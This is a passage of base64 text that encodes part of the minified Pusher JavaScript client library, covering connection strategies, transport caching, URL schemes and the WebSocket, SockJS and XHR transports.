nRpbWVsaW5lPW4udGltZWxpbmV9ZnVuY3Rpb24gdChlKXtyZXR1cm4icHVzaGVyVHJhbnNwb3J0IisoZT8iRW5jcnlwdGVkIjoiVW5lbmNyeXB0ZWQiKX1mdW5jdGlvbiBuKGUpe3ZhciBuPVB1c2hlci5VdGlsLmdldExvY2FsU3RvcmFnZSgpO2lmKG4pdHJ5e3ZhciByPW5bdChlKV07aWYocilyZXR1cm4gSlNPTi5wYXJzZShyKX1jYXRjaChzKXtpKGUpfXJldHVybiBudWxsfWZ1bmN0aW9uIHIoZSxuLHIpe3ZhciBpPVB1c2hlci5VdGlsLmdldExvY2FsU3RvcmFnZSgpO2lmKGkpdHJ5e2lbdChlKV09SlNPTi5zdHJpbmdpZnkoe3RpbWVzdGFtcDpQdXNoZXIuVXRpbC5ub3coKSx0cmFuc3BvcnQ6bixsYXRlbmN5OnJ9KX1jYXRjaChzKXt9fWZ1bmN0aW9uIGkoZSl7dmFyIG49UHVzaGVyLlV0aWwuZ2V0TG9jYWxTdG9yYWdlKCk7aWYobil0cnl7ZGVsZXRlIG5bdChlKV19Y2F0Y2gocil7fX12YXIgcz1lLnByb3RvdHlwZTtzLmlzU3VwcG9ydGVkPWZ1bmN0aW9uKCl7cmV0dXJuIHRoaXMuc3RyYXRlZ3kuaXNTdXBwb3J0ZWQoKX0scy5jb25uZWN0PWZ1bmN0aW9uKGUsdCl7dmFyIHM9dGhpcy5lbmNyeXB0ZWQsbz1uKHMpLGE9W3RoaXMuc3RyYXRlZ3ldO2lmKG8mJm8udGltZXN0YW1wK3RoaXMudHRsPj1QdXNoZXIuVXRpbC5ub3coKSl7dmFyIHU9dGhpcy50cmFuc3BvcnRzW28udHJhbnNwb3J0XTt1JiYodGhpcy50aW1lbGluZS5pbmZvKHtjYWNoZWQ6ITAsdHJhbnNwb3J0Om8udHJhbnNwb3J0LGxhdGVuY3k6by5sYXRlbmN5fSksYS5wdXNoKG5ldyBQdXNoZXIuU2VxdWVudGlhbFN0cmF0ZWd5KFt1XSx7dGltZW91dDoyKm8ubGF0ZW5jeSsxZTMsZmFpbEZhc3Q6ITB9KSkpfXZhciBjPVB1c2hlci5VdGlsLm5vdygpLGw9YS5wb3AoKS5jb25uZWN0KGUsZnVuY3Rpb24gZChuLG8pe24/KGkocyksYS5sZW5ndGg+MD8oYz1QdXNoZXIuVXRpbC5ub3coKSxsPWEucG9wKCkuY29ubmVjdChlLGQpKTp0KG4pKToocihzLG8udHJhbnNwb3J0Lm5hbWUsUHVzaGVyLlV0aWwubm93KCktYyksdChudWxsLG8pKX0pO3JldHVybnthYm9ydDpmdW5jdGlvbigpe2wuYWJvcnQoKX0sZm9yY2VNaW5Qcmlvcml0eTpmdW5jdGlvbih0KXtlPXQsbCYmbC5mb3JjZU1pblByaW9yaXR5KHQpfX19LFB1c2hlci5DYWNoZWRTdHJhdGVneT1lfS5jYWxsKHRoaXMpLGZ1bmN0aW9uKCl7ZnVuY3Rpb24gZShlLHQpe3RoaXMuc3RyYXRlZ3k9ZSx0aGlzLm9wdGlvbnM9e2RlbGF5OnQuZGVsYXl9fXZhciB0PWUucHJvdG90eXBlO3QuaXNTdXBwb3J0ZWQ9ZnVuY3Rpb24oKXtyZXR1cm4gdGhpcy5zdHJhdGVneS5pc1N1cHBvcnRlZCgpfSx0LmNvbm5lY3Q9ZnVuY3Rpb24oZSx0KXt2YXIgbixyPXRoaXMuc3RyYXRlZ3ksaT1uZXcgUHVzaGVyLlRpbWVyKHRoaXMub3B0aW9ucy5kZWxheSxmdW5jdGlvbigpe249ci5jb25uZWN0KGUsdCl9KTtyZXR1cm57YWJvcnQ6ZnVuY3Rpb24oKXtpLmVuc3VyZUFib3J0ZWQoKSxuJiZuLmFib3J0KCl9LGZvcmNlTWluUHJpb3JpdHk6ZnVuY3Rpb24odCl7ZT10LG4mJm4uZm9yY2VNaW5Qcmlvcml0eSh0KX19fSxQdXNoZXIuRGVsYXllZFN0cmF0ZWd5PWV9LmNhbGwodGhpcyksZnVuY3Rpb24oKXtmdW5jdGlvbiBlKGUpe3RoaXMuc3RyYXRlZ3k9ZX12YXIgdD1lLnByb3RvdHlwZTt0LmlzU3VwcG9ydGVkPWZ1bmN0aW9uKCl7cmV0dXJuIHRoaXMuc3RyYXRlZ3kuaXNTdXBwb3J0ZWQoKX0sdC5jb25uZWN0PWZ1bmN0aW9uKGUsdCl7dmFyIG49dGhpcy5zdHJhdGVneS5jb25uZWN0KGUsZnVuY3Rpb24oZSxyKXtyJiZuLmFib3J0KCksdChlLHIpfSk7cmV0dXJuIG59LFB1c2hlci5GaXJzdENvbm5lY3RlZFN0cmF0ZWd5PWV9LmNhbGwodGhpcyksZnVuY3Rpb24oKXtmdW5jdGlvbiBlKGUsdCxuKXt0aGlzLnRlc3Q9ZSx0aGlzLnRydWVCcmFuY2g9dCx0aGlzLmZhbHNlQnJhbmNoPW59dmFyIHQ9ZS5wcm90b3R5cGU7dC5pc1N1cHBvcnRlZD1mdW5jdGlvbigpe3ZhciBlPXRoaXMudGVzdCgpP3RoaXMudHJ1ZUJyYW5jaDp0aGlzLmZhbHNlQnJhbmNoO3JldHVybiBlLmlzU3VwcG9ydGVkKCl9LHQuY29ubmVjdD1mdW5jdGlvbihlLHQpe3ZhciBuPXRoaXMudGVzdCgpP3RoaXMudHJ1ZUJyYW5jaDp0aGlzLmZhbHNlQnJhbmNoO3JldHVybiBuLmNvbm5lY3QoZSx0KX0sUHVzaGVyLklmU3RyYXRlZ3k9ZX0uY2FsbCh0aGlzKSxmdW5jdGlvbigpe2Z1bmN0aW9uIGUoZSx0KXt0aGlzLnN0cmF0ZWdpZXM9ZSx0aGlzLmxvb3A9Qm9vbGVhbih0Lmxvb3ApLHRoaXMuZmFpbEZhc3Q9Qm9vbGVhbih0LmZhaWxGYXN0KSx0aGlzLnRpbWVvdXQ9dC50aW1lb3V0LHRoaXMudGltZW91dExpbWl0PXQudGltZW91dExpbWl0fXZhciB0PWUucHJvdG90eXBlO3QuaXNTdXBwb3J0ZWQ9ZnVuY3Rpb24oKXtyZXR1cm4gUHVzaGVyLlV0aWwuYW55KHRoaXMuc3RyYXRlZ2llcyxQdXNoZXIuVXRpbC5tZXRob2QoImlzU3VwcG9ydGVkIikpfSx0LmNvbm5lY3Q9ZnVuY3Rpb24oZSx0KXt2YXIgbj10aGlzLHI9dGhpcy5zdHJhdGVnaWVzLGk9MCxzPXRoaXMudGltZW91dCxvPW51bGwsYT1mdW5jdGlvbih1LGMpe2M/dChudWxsLGMpOihpKz0xLG4ubG9vcCYmKGklPXIubGVuZ3RoKSxpPHIubGVuZ3RoPyhzJiYocz0yKnMsbi50aW1lb3V0TGltaXQmJihzPU1hdGgubWluKHMsbi50aW1lb3V0TGltaXQpKSksbz1uLnRyeVN0cmF0ZWd5KHJbaV0sZSx7dGltZW91dDpzLGZhaWxGYXN0Om4uZmFpbEZhc3R9LGEpKTp0KCEwKSl9O3JldHVybiBvPXRoaXMudHJ5U3RyYXRlZ3kocltpXSxlLHt0aW1lb3V0OnMsZmFpbEZhc3Q6dGhpcy5mYWlsRmFzdH0sYSkse2Fib3J0OmZ1bmN0aW9uKCl7by5hYm9ydCgpfSxmb3JjZU1pblByaW9yaXR5OmZ1bmN0aW9uKHQpe2U9dCxvJiZvLmZvcmNlTWluUHJpb3JpdHkodCl9fX0sdC50cnlTdHJhdGVneT1mdW5jdGlvbihlLHQsbixyKXt2YXIgaT1udWxsLHM9bnVsbDtyZXR1cm4gbi50aW1lb3V0PjAmJihpPW5ldyBQdXNoZXIuVGltZXIobi50aW1lb3V0LGZ1bmN0aW9uKCl7cy5hYm9ydCgpLHIoITApfSkpLHM9ZS5jb25uZWN0KHQsZnVuY3Rpb24oZSx0KXtlJiZpJiZpLmlzUnVubmluZygpJiYhbi5mYWlsRmFzdHx8KGkmJmkuZW5zdXJlQWJvcnRlZCgpLHIoZSx0KSl9KSx7YWJvcnQ6ZnVuY3Rpb24oKXtpJiZpLmVuc3VyZUFib3J0ZWQoKSxzLmFib3J0KCl9LGZvcmNlTWluUHJpb3JpdHk6ZnVuY3Rpb24oZSl7cy5mb3JjZU1pblByaW9yaXR5KGUpfX19LFB1c2hlci5TZXF1ZW50aWFsU3RyYXRlZ3k9ZX0uY2FsbCh0aGlzKSxmdW5jdGlvbigpe2Z1bmN0aW9uIGUoZSx0LG4scil7dGhpcy5uYW1lPWUsdGhpcy5wcmlvcml0eT10LHRoaXMudHJhbnNwb3J0PW4sdGhpcy5vcHRpb25zPXJ8fHt9fWZ1bmN0aW9uIHQoZSx0KXtyZXR1cm4gUHVzaGVyLlV0aWwuZGVmZXIoZnVuY3Rpb24oKXt0KGUpfSkse2Fib3J0OmZ1bmN0aW9uKCl7fSxmb3JjZU1pblByaW9yaXR5OmZ1bmN0aW9uKCl7fX19dmFyIG49ZS5wcm90b3R5cGU7bi5pc1N1cHBvcnRlZD1mdW5jdGlvbigpe3JldHVybiB0aGlzLnRyYW5zcG9ydC5pc1N1cHBvcnRlZCh7ZW5jcnlwdGVkOnRoaXMub3B0aW9ucy5lbmNyeXB0ZWR9KX0sbi5jb25uZWN0PWZ1bmN0aW9uKGUsbil7aWYoIXRoaXMuaXNTdXBwb3J0ZWQoKSlyZXR1cm4gdChuZXcgUHVzaGVyLkVycm9ycy5VbnN1cHBvcnRlZFN0cmF0ZWd5LG4pO2lmKHRoaXMucHJpb3JpdHk8ZSlyZXR1cm4gdChuZXcgUHVzaGVyLkVycm9ycy5UcmFuc3BvcnRQcmlvcml0eVRvb0xvdyxuKTt2YXIgcj10aGlzLGk9ITEscz10aGlzLnRyYW5zcG9ydC5jcmVhdGVDb25uZWN0aW9uKHRoaXMubmFtZSx0aGlzLnByaW9yaXR5LHRoaXMub3B0aW9ucy5rZXksdGhpcy5vcHRpb25zKSxvPW51bGwsYT1mdW5jdGlvbigpe3MudW5iaW5kKCJpbml0aWFsaXplZCIsYSkscy5jb25uZWN0KCl9LHU9ZnVuY3Rpb24oKXtvPW5ldyBQdXNoZXIuSGFuZHNoYWtlKHMsZnVuY3Rpb24oZSl7aT0hMCxkKCksbihudWxsLGUpfSl9LGM9ZnVuY3Rpb24oZSl7ZCgpLG4oZSl9LGw9ZnVuY3Rpb24oKXtkKCksbihuZXcgUHVzaGVyLkVycm9ycy5UcmFuc3BvcnRDbG9zZWQocykpfSxkPWZ1bmN0aW9uKCl7cy51bmJpbmQoImluaXRpYWxpemVkIixhKSxzLnVuYmluZCgib3BlbiIsdSkscy51bmJpbmQoImVycm9yIixjKSxzLnVuYmluZCgiY2xvc2VkIixsKX07cmV0dXJuIHMuYmluZCgiaW5pdGlhbGl6ZWQiLGEpLHMuYmluZCgib3BlbiIsdSkscy5iaW5kKCJlcnJvciIsYykscy5iaW5kKCJjbG9zZWQiLGwpLHMuaW5pdGlhbGl6ZSgpLHthYm9ydDpmdW5jdGlvbigpe2l8fChkKCksbz9vLmNsb3NlKCk6cy5jbG9zZSgpKX0sZm9yY2VNaW5Qcmlvcml0eTpmdW5jdGlvbihlKXtpfHxyLnByaW9yaXR5PGUmJihvP28uY2xvc2UoKTpzLmNsb3NlKCkpfX19LFB1c2hlci5UcmFuc3BvcnRTdHJhdGVneT1lfS5jYWxsKHRoaXMpLGZ1bmN0aW9uKCl7ZnVuY3Rpb24gZShlLHQsbil7dmFyIHI9ZSsodC5lbmNyeXB0ZWQ/InMiOiIiKSxpPXQuZW5jcnlwdGVkP3QuaG9zdEVuY3J5cHRlZDp0Lmhvc3RVbmVuY3J5cHRlZDtyZXR1cm4gcisiOi8vIitpK259ZnVuY3Rpb24gdChlLHQpe3ZhciBuPSIvYXBwLyIrZSxyPSI/cHJvdG9jb2w9IitQdXNoZXIuUFJPVE9DT0wrIiZjbGllbnQ9anMmdmVyc2lvbj0iK1B1c2hlci5WRVJTSU9OKyh0PyImIit0OiIiKTtyZXR1cm4gbityfVB1c2hlci5VUkxTY2hlbWVzPXt3czp7Z2V0SW5pdGlhbDpmdW5jdGlvbihuLHIpe3JldHVybiBlKCJ3cyIscix0KG4sImZsYXNoPWZhbHNlIikpfX0sc29ja2pzOntnZXRJbml0aWFsOmZ1bmN0aW9uKHQsbil7cmV0dXJuIGUoImh0dHAiLG4sbi5odHRwUGF0aHx8Ii9wdXNoZXIiLCIiKX0sZ2V0UGF0aDpmdW5jdGlvbihlLG4pe3JldHVybiB0KGUpfX0saHR0cDp7Z2V0SW5pdGlhbDpmdW5jdGlvbihuLHIpe3ZhciBpPShyLmh0dHBQYXRofHwiL3B1c2hlciIpK3Qobik7cmV0dXJuIGUoImh0dHAiLHIsaSl9fX19LmNhbGwodGhpcyksZnVuY3Rpb24oKXtmdW5jdGlvbiBlKGUsdCxuLHIsaSl7UHVzaGVyLkV2ZW50c0Rpc3BhdGNoZXIuY2FsbCh0aGlzKSx0aGlzLmhvb2tzPWUsdGhpcy5uYW1lPXQsdGhpcy5wcmlvcml0eT1uLHRoaXMua2V5PXIsdGhpcy5vcHRpb25zPWksdGhpcy5zdGF0ZT0ibmV3Iix0aGlzLnRpbWVsaW5lPWkudGltZWxpbmUsdGhpcy5hY3Rpdml0eVRpbWVvdXQ9aS5hY3Rpdml0eVRpbWVvdXQsdGhpcy5pZD10aGlzLnRpbWVsaW5lLmdlbmVyYXRlVW5pcXVlSUQoKX12YXIgdD1lLnByb3RvdHlwZTtQdXNoZXIuVXRpbC5leHRlbmQodCxQdXNoZXIuRXZlbnRzRGlzcGF0Y2hlci5wcm90b3R5cGUpLHQuaGFuZGxlc0FjdGl2aXR5Q2hlY2tzPWZ1bmN0aW9uKCl7cmV0dXJuIEJvb2xlYW4odGhpcy5ob29rcy5oYW5kbGVzQWN0aXZpdHlDaGVja3MpfSx0LnN1cHBvcnRzUGluZz1mdW5jdGlvbigpe3JldHVybiBCb29sZWFuKHRoaXMuaG9va3Muc3VwcG9ydHNQaW5nKX0sdC5pbml0aWFsaXplPWZ1bmN0aW9uKCl7dmFyIGU9dGhpcztlLnRpbWVsaW5lLmluZm8oZS5idWlsZFRpbWVsaW5lTWVzc2FnZSh7dHJhbnNwb3J0OmUubmFtZSsoZS5vcHRpb25zLmVuY3J5cHRlZD8icyI6IiIpfSkpLGUuaG9va3MuaXNJbml0aWFsaXplZCgpP2UuY2hhbmdlU3RhdGUoImluaXRpYWxpemVkIik6ZS5ob29rcy5maWxlPyhlLmNoYW5nZVN0YXRlKCJpbml0aWFsaXppbmciKSxQdXNoZXIuRGVwZW5kZW5jaWVzLmxvYWQoZS5ob29rcy5maWxlLHtlbmNyeXB0ZWQ6ZS5vcHRpb25zLmVuY3J5cHRlZH0sZnVuY3Rpb24odCxuKXtlLmhvb2tzLmlzSW5pdGlhbGl6ZWQoKT8oZS5jaGFuZ2VTdGF0ZSgiaW5pdGlhbGl6ZWQiKSxuKCEwKSk6KHQmJmUub25FcnJvcih0KSxlLm9uQ2xvc2UoKSxuKCExKSl9KSk6ZS5vbkNsb3NlKCl9LHQuY29ubmVjdD1mdW5jdGlvbigpe3ZhciBlPXRoaXM7aWYoZS5zb2NrZXR8fCJpbml0aWFsaXplZCIhPT1lLnN0YXRlKXJldHVybiExO3ZhciB0PWUuaG9va3MudXJscy5nZXRJbml0aWFsKGUua2V5LGUub3B0aW9ucyk7dHJ5e2Uuc29ja2V0PWUuaG9va3MuZ2V0U29ja2V0KHQsZS5vcHRpb25zKX1jYXRjaChuKXtyZXR1cm4gUHVzaGVyLlV0aWwuZGVmZXIoZnVuY3Rpb24oKXtlLm9uRXJyb3IobiksZS5jaGFuZ2VTdGF0ZSgiY2xvc2VkIil9KSwhMX1yZXR1cm4gZS5iaW5kTGlzdGVuZXJzKCksUHVzaGVyLmRlYnVnKCJDb25uZWN0aW5nIix7dHJhbnNwb3J0OmUubmFtZSx1cmw6dH0pLGUuY2hhbmdlU3RhdGUoImNvbm5lY3RpbmciKSwhMH0sdC5jbG9zZT1mdW5jdGlvbigpe3JldHVybiB0aGlzLnNvY2tldD8odGhpcy5zb2NrZXQuY2xvc2UoKSwhMCk6ITF9LHQuc2VuZD1mdW5jdGlvbihlKXt2YXIgdD10aGlzO3JldHVybiJvcGVuIj09PXQuc3RhdGU/KFB1c2hlci5VdGlsLmRlZmVyKGZ1bmN0aW9uKCl7dC5zb2NrZXQmJnQuc29ja2V0LnNlbmQoZSl9KSwhMCk6ITF9LHQucGluZz1mdW5jdGlvbigpeyJvcGVuIj09PXRoaXMuc3RhdGUmJnRoaXMuc3VwcG9ydHNQaW5nKCkmJnRoaXMuc29ja2V0LnBpbmcoKX0sdC5vbk9wZW49ZnVuY3Rpb24oKXt0aGlzLmhvb2tzLmJlZm9yZU9wZW4mJnRoaXMuaG9va3MuYmVmb3JlT3Blbih0aGlzLnNvY2tldCx0aGlzLmhvb2tzLnVybHMuZ2V0UGF0aCh0aGlzLmtleSx0aGlzLm9wdGlvbnMpKSx0aGlzLmNoYW5nZVN0YXRlKCJvcGVuIiksdGhpcy5zb2NrZXQub25vcGVuPXZvaWQgMH0sdC5vbkVycm9yPWZ1bmN0aW9uKGUpe3RoaXMuZW1pdCgiZXJyb3IiLHt0eXBlOiJXZWJTb2NrZXRFcnJvciIsZXJyb3I6ZX0pLHRoaXMudGltZWxpbmUuZXJyb3IodGhpcy5idWlsZFRpbWVsaW5lTWVzc2FnZSh7ZXJyb3I6ZS50b1N0cmluZygpfSkpfSx0Lm9uQ2xvc2U9ZnVuY3Rpb24oZSl7ZT90aGlzLmNoYW5nZVN0YXRlKCJjbG9zZWQiLHtjb2RlOmUuY29kZSxyZWFzb246ZS5yZWFzb24sd2FzQ2xlYW46ZS53YXNDbGVhbn0pOnRoaXMuY2hhbmdlU3RhdGUoImNsb3NlZCIpLHRoaXMudW5iaW5kTGlzdGVuZXJzKCksdGhpcy5zb2NrZXQ9dm9pZCAwfSx0Lm9uTWVzc2FnZT1mdW5jdGlvbihlKXt0aGlzLmVtaXQoIm1lc3NhZ2UiLGUpfSx0Lm9uQWN0aXZpdHk9ZnVuY3Rpb24oKXt0aGlzLmVtaXQoImFjdGl2aXR5Iil9LHQuYmluZExpc3RlbmVycz1mdW5jdGlvbigpe3ZhciBlPXRoaXM7ZS5zb2NrZXQub25vcGVuPWZ1bmN0aW9uKCl7ZS5vbk9wZW4oKX0sZS5zb2NrZXQub25lcnJvcj1mdW5jdGlvbih0KXtlLm9uRXJyb3IodCl9LGUuc29ja2V0Lm9uY2xvc2U9ZnVuY3Rpb24odCl7ZS5vbkNsb3NlKHQpfSxlLnNvY2tldC5vbm1lc3NhZ2U9ZnVuY3Rpb24odCl7ZS5vbk1lc3NhZ2UodCl9LGUuc3VwcG9ydHNQaW5nKCkmJihlLnNvY2tldC5vbmFjdGl2aXR5PWZ1bmN0aW9uKCl7ZS5vbkFjdGl2aXR5KCl9KX0sdC51bmJpbmRMaXN0ZW5lcnM9ZnVuY3Rpb24oKXt0aGlzLnNvY2tldCYmKHRoaXMuc29ja2V0Lm9ub3Blbj12b2lkIDAsdGhpcy5zb2NrZXQub25lcnJvcj12b2lkIDAsdGhpcy5zb2NrZXQub25jbG9zZT12b2lkIDAsdGhpcy5zb2NrZXQub25tZXNzYWdlPXZvaWQgMCx0aGlzLnN1cHBvcnRzUGluZygpJiYodGhpcy5zb2NrZXQub25hY3Rpdml0eT12b2lkIDApKX0sdC5jaGFuZ2VTdGF0ZT1mdW5jdGlvbihlLHQpe3RoaXMuc3RhdGU9ZSx0aGlzLnRpbWVsaW5lLmluZm8odGhpcy5idWlsZFRpbWVsaW5lTWVzc2FnZSh7c3RhdGU6ZSxwYXJhbXM6dH0pKSx0aGlzLmVtaXQoZSx0KX0sdC5idWlsZFRpbWVsaW5lTWVzc2FnZT1mdW5jdGlvbihlKXtyZXR1cm4gUHVzaGVyLlV0aWwuZXh0ZW5kKHtjaWQ6dGhpcy5pZH0sZSl9LFB1c2hlci5UcmFuc3BvcnRDb25uZWN0aW9uPWV9LmNhbGwodGhpcyksZnVuY3Rpb24oKXtmdW5jdGlvbiBlKGUpe3RoaXMuaG9va3M9ZX12YXIgdD1lLnByb3RvdHlwZTt0LmlzU3VwcG9ydGVkPWZ1bmN0aW9uKGUpe3JldHVybiB0aGlzLmhvb2tzLmlzU3VwcG9ydGVkKGUpfSx0LmNyZWF0ZUNvbm5lY3Rpb249ZnVuY3Rpb24oZSx0LG4scil7cmV0dXJuIG5ldyBQdXNoZXIuVHJhbnNwb3J0Q29ubmVjdGlvbih0aGlzLmhvb2tzLGUsdCxuLHIpfSxQdXNoZXIuVHJhbnNwb3J0PWV9LmNhbGwodGhpcyksZnVuY3Rpb24oKXtQdXNoZXIuV1NUcmFuc3BvcnQ9bmV3IFB1c2hlci5UcmFuc3BvcnQoe3VybHM6UHVzaGVyLlVSTFNjaGVtZXMud3MsaGFuZGxlc0FjdGl2aXR5Q2hlY2tzOiExLHN1cHBvcnRzUGluZzohMSxpc0luaXRpYWxpemVkOmZ1bmN0aW9uKCl7cmV0dXJuIEJvb2xlYW4od2luZG93LldlYlNvY2tldHx8d2luZG93Lk1veldlYlNvY2tldCl9LGlzU3VwcG9ydGVkOmZ1bmN0aW9uKCl7cmV0dXJuIEJvb2xlYW4od2luZG93LldlYlNvY2tldHx8d2luZG93Lk1veldlYlNvY2tldCl9LGdldFNvY2tldDpmdW5jdGlvbihlKXt2YXIgdD13aW5kb3cuV2ViU29ja2V0fHx3aW5kb3cuTW96V2ViU29ja2V0O3JldHVybiBuZXcgdChlKX19KSxQdXNoZXIuU29ja0pTVHJhbnNwb3J0PW5ldyBQdXNoZXIuVHJhbnNwb3J0KHtmaWxlOiJzb2NranMiLHVybHM6UHVzaGVyLlVSTFNjaGVtZXMuc29ja2pzLGhhbmRsZXNBY3Rpdml0eUNoZWNrczohMCxzdXBwb3J0c1Bpbmc6ITEsaXNTdXBwb3J0ZWQ6ZnVuY3Rpb24oKXtyZXR1cm4hMH0saXNJbml0aWFsaXplZDpmdW5jdGlvbigpe3JldHVybiB2b2lkIDAhPT13aW5kb3cuU29ja0pTfSxnZXRTb2NrZXQ6ZnVuY3Rpb24oZSx0KXtyZXR1cm4gbmV3IFNvY2tKUyhlLG51bGwse2pzX3BhdGg6UHVzaGVyLkRlcGVuZGVuY2llcy5nZXRQYXRoKCJzb2NranMiLHtlbmNyeXB0ZWQ6dC5lbmNyeXB0ZWR9KSxpZ25vcmVfbnVsbF9vcmlnaW46dC5pZ25vcmVOdWxsT3JpZ2lufSl9LGJlZm9yZU9wZW46ZnVuY3Rpb24oZSx0KXtlLnNlbmQoSlNPTi5zdHJpbmdpZnkoe3BhdGg6dH0pKX19KTt2YXIgZT17dXJsczpQdXNoZXIuVVJMU2NoZW1lcy5odHRwLGhhbmRsZXNBY3Rpdml0eUNoZWNrczohMSxzdXBwb3J0c1Bpbmc6ITAsaXNJbml0aWFsaXplZDpmdW5jdGlvbigpe3JldHVybiBCb29sZWFuKFB1c2hlci5IVFRQLlNvY2tldCl9fSx0PVB1c2hlci5VdGlsLmV4dGVuZCh7Z2V0U29ja2V0OmZ1bmN0aW9uKGUpe3JldHVybiBQdXNoZXIuSFRUUC5nZXRTdHJlYW1pbmdTb2NrZXQoZSl9fSxlKSxuPVB1c2hlci5VdGlsLmV4dGVuZCh7Z2V0U29ja2V0OmZ1bmN0aW9uKGUpe3JldHVybiBQdXNoZXIuSFRUUC5nZXRQb2xsaW5nU29ja2V0KGUpfX0sZSkscj17ZmlsZToieGhyIixpc1N1cHBvcnRlZDpQdXNoZXIuVXRpbC5pc1hIUlN1cHBvcnRlZH0saT17ZmlsZToieGRyIixpc1N1cHBvcnRlZDpmdW5jdGlvbihlKXtyZXR1cm4gUHVzaGVyLlV0aWwuaXNYRFJTdXBwb3J0ZWQoZS5lbmNyeXB0ZWQpfX07UHVzaGVyLlhIUlN0cmVhbWluZ1RyYW5zcG9ydD1uZXcgUHVzaGVyLlRyYW5zcG9ydChQdXNoZXIuVXRpbC5leHRlbmQoe30sdCxyKSksUHVzaGVyLlhEUlN0cmVhbWluZ1RyYW5zcG9ydD1uZXcgUHVzaGVyLlRyYW5zcG9ydChQdXNoZXIuVXRpbC5leHRlbmQoe30sdCxpKSksUHVzaGVyLlhIUlBvbGxpbmdUcmFuc3BvcnQ9bmV3IFB1c2hlci5UcmFuc3BvcnQoUHVzaGVyLlV0aWwuZXh0ZW5kKHt9LG4scikpLFB1c2hlci5YRFJQb2xsaW5nVHJhbnNwb3J0PW5ldyBQdXNoZXIuVHJhbnNwb3J0KFB1c2hlci5VdGlsLmV4dGVuZCh7fSxuLGkpKX0uY2FsbCh0aGlzKSxmdW5jdGlvbigpe2Z1bmN0aW9uIGUoZSx0LG4pe3RoaXMubWFuYWdlcj1lLHRoaXMudHJhbnNwb3J0PXQsdGhpcy5taW5QaW5nRGVsYXk9bi5taW5QaW5nRGVsYXksdGhpcy5tYXhQaW5nRGVsYXk9bi5tYXhQaW5nRGVsYXksdGhpcy5waW5nRGVsYXk9dm9pZCAwfXZhciB0PWUucHJvdG90eXBlO3QuY3JlYXRlQ29ubmVjdGlvbj1mdW5jdGlvbihlLHQsbixyKXt2YXIgaT10aGlzO3I9UHVzaGVyLlV0aWwuZXh0ZW5kKHt9LHIse2FjdGl2aXR5VGltZW91dDppLnBpbmdEZWxheX0pO3ZhciBzPWkudHJhbnNwb3J0LmNyZWF0ZUNvbm5lY3Rpb24oZSx0LG4sciksbz1udWxsLGE9ZnVuY3Rpb24oKXtzLnVuYmluZCgib3BlbiIsYSkscy5iaW5kKCJjbG9zZWQiLHUpLG89UHVzaGVyLlV0aWwubm93KCl9LHU9ZnVuY3Rpb24oZSl7aWYocy51bmJpbmQoImNsb3NlZCIsdSksMTAwMj09PWUuY29kZXx8MTAwMz09PWUuY29kZSlpLm1hbmFnZXIucmVwb3J0RGVhdGgoKTtlbHNlIGlmKCFlLndhc0NsZWFuJiZvKXt2YXIgdD1QdXNoZXIuVXRpbC5ub3coKS1vO3Q8MippLm1heFBpbmdEZWxheSYmKGkubWFuYWdlci5yZXBvcnREZWF0aCgpLGkucGluZ0RlbGF5PU1hdGgubWF4KHQvMixpLm1pblBpbmdEZWxheSkpfX07cmV0dXJuIHMuYmluZCgib3BlbiIsYSksc30sdC5pc1N1cHBvcnRlZD1mdW5jdGlvbihlKXtyZXR1cm4gdGhpcy5tYW5hZ2VyLmlzQWxpdmUoKSYmdGhpcy50cmFuc3BvcnQuaXNTdXBwb3J0ZWQoZSl9LFB1c2hlci5Bc3Npc3RhbnRUb1RoZVRyYW5zcG9ydE1hbmFnZXI9ZX0uY2FsbCh0aGlzKSxmdW5jdGlvbigpe2Z1bmN0aW9uIGUoZSl7dGhpcy5vcHRpb25zPWV8fHt9LHRoaXMubGl2ZXNMZWZ0PXRoaXMub3B0aW9ucy5saXZlc3x8MS8wfXZhciB0PWUucHJvdG90eXBlO3QuZ2V0QXNzaXN0YW50PWZ1bmN0aW9uKGUpe3JldHVybiBuZXcgUHVzaGVyLkFzc2lzdGFudFRvVGhlVHJhbnNwb3J0TWFuYWdlcih0aGlzLGUse21pblBpbmdEZWxheTp0aGlzLm9wdGlvbnMubWluUGluZ0RlbGF5LG1heFBpbmdEZWxheTp0aGlzLm9wdGlvbnMubWF4UGluZ0RlbGF5fSl9LHQuaXNBbGl2ZT1mdW5jdGlvbigpe3JldHVybiB0aGlzLmxpdmVzTGVmdD4wfSx0LnJlcG9ydERlYXRoPWZ1bmN0aW9uKCl7dGhpcy5saXZlc0xlZnQtPTF9LFB1c2hlci5UcmFuc3BvcnRNYW5hZ2VyPWV9LmNhbGwodGhpcyksZnVuY3Rpb24oKXtmdW5jdGlvbiBlKGUpe3JldHVybiBmdW5jdGlvbih0KXtyZXR1cm5bZS5hcHBseSh0aGlzLGFyZ3VtZW50cyksdF19fWZ1bmN0aW9uIHQoZSl7cmV0dXJuInN0cmluZyI9PXR5cGVvZiBlJiYiOiI9PT1lLmNoYXJBdCgwKX1mdW5jdGlvbiBuKGUsdCl7cmV0dXJuIHRbZS5zbGljZSgxKV19ZnVuY3Rpb24gcihlLHQpe2lmKDA9PT1lLmxlbmd0aClyZXR1cm5bW10sdF07dmFyIG49byhlWzBdLHQpLGk9cihlLnNsaWNlKDEpLG5bMV0pO3JldHVybltbblswXV0uY29uY2F0KGlbMF0pLGlbMV1dfWZ1bmN0aW9uIGkoZSxyKXtpZighdChlKSlyZXR1cm5bZSxyXTt2YXIgaT1uKGUscik7aWYodm9pZCAwPT09aSl0aHJvdyJVbmRlZmluZWQgc3ltYm9sICIrZTtyZXR1cm5baSxyXX1mdW5jdGlvbiBzKGUsaSl7aWYodChlWzBdKSl7dmFyIHM9bihlWzBdLGkpO2lmKGUubGVuZ3RoPjEpe2lmKCJmdW5jdGlvbiIhPXR5cGVvZiBzKXRocm93IkNhbGxpbmcgbm9uLWZ1bmN0aW9uICIrZVswXTt2YXIgYT1bUHVzaGVyLlV0aWwuZXh0ZW5kKHt9LGkpXS5jb25jYXQoUHVzaGVyLlV0aWwubWFwKGUuc2xpY2UoMSksZnVuY3Rpb24oZSl7cmV0dXJuIG8oZSxQdXNoZXIuVXRpbC5leHRlbmQoe30saSkpWzBdfSkpO3JldHVybiBzLmFwcGx5KHRoaXMsYSl9cmV0dXJuW3MsaV19cmV0dXJuIHIoZSxpKX1mdW5jdGlvbiBvKGUsdCl7cmV0dXJuInN0cmluZyI9PXR5cGVvZiBlP2koZSx0KToib2JqZWN0Ij09dHlwZW9mIGUmJmUgaW5zdGFuY2VvZiBBcnJheSYmZS5sZW5ndGg+MD9zKGUsdCk6W2UsdF19dmFyIGE9e2J1aWxkOmZ1bmN0aW9uKGUsdCl7dmFyIG49UHVzaGVyLlV0aW